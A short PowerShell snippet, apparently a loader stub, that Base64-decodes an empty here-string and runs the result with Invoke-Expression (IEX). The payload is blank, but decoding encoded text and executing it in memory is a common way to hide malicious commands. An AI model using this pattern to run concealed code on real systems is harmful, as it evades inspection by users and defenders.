
$qwertyuioop = @'

'@


$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qwertyuioop))

IEX $Decryption
